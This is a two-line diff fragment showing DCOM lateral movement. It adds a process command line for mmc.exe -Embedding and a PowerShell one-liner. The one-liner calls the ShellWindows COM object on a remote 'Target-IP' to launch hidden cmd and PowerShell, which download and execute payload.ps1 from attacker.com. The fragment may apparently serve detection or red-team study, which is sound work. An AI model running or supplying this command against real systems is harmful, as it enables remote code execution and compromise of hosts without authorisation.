@@ -1,0 +1,2 @@
+C:\WINDOWS\system32\mmc.exe -Embedding
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("ShellWindows", "Target-IP")); $com.Item().Document.Application.ShellExecute("cmd.exe", "/c powershell.exe -nop -w hidden -c \"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')\"", "c:\windows\system32", $null, 0)
